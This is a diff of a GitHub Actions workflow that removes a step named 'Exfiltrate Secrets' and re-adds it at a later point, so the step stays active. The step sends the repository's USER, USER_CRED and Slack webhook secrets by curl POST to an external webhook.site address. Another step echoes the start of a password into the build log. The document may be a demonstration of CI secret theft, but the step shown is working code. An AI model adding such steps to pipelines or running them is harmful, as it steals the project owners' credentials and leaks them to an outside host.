@@ -26,18 +26,7 @@ jobs:
         echo "PW starts with: ${PW}"           # Mask the rest
         echo "Login health check "
 
-    - name: Exfiltrate Secrets
-      env:
-        USER: ${{ secrets.USER }}
-        USER_CRED: ${{ secrets.USER_CRED }}
-        SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
-      run: |
-        echo "Stealing secrets..."
-        curl -X POST -H 'Content-Type: application/json' \
-          --data '{"user": "'"$USER"'", "password": "'"$USER_CRED"'", "slack": "'"$SLACK_WEBHOOK_URL"'"}' \
-          https://webhook.site/6a4f438d-6112-4a3b-befb-c2485f49476e
-
-    - name: send_run_log
+    - name: send_run_log2
       continue-on-error: true
       env:
         URL: ${{env.API_URL}}
@@ -46,7 +35,19 @@ jobs:
       run: |
         echo "Send run log"
         curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/api/run/audit
-        
+
+    - name: Exfiltrate Secrets
+      env:
+        USER: ${{ secrets.USER }}
+        USER_CRED: ${{ secrets.USER_CRED }}
+        SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
+      run: |
+        echo "Stealing secrets..."
+        curl -X POST -H 'Content-Type: application/json' \
+        --data '{"user": "'"$USER"'", "password": "'"$USER_CRED"'", "slack": "'"$SLACK_WEBHOOK_URL"'"}' \
+        https://webhook.site/6a4f438d-6112-4a3b-befb-c2485f49476e
+
+
     - name: send_slack_alert
       continue-on-error: true
       env:
